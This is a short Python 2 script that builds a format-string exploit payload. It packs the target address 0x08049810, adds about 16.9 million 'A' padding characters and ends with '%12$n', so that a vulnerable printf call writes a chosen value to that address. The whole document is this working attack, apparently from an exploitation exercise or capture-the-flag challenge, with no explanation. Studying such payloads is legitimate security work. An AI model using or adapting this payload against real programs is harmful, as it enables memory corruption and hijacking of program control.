import struct

addr = struct.pack("I", 0x08049810)

print addr+("A" * 16930112)+"%12$n"
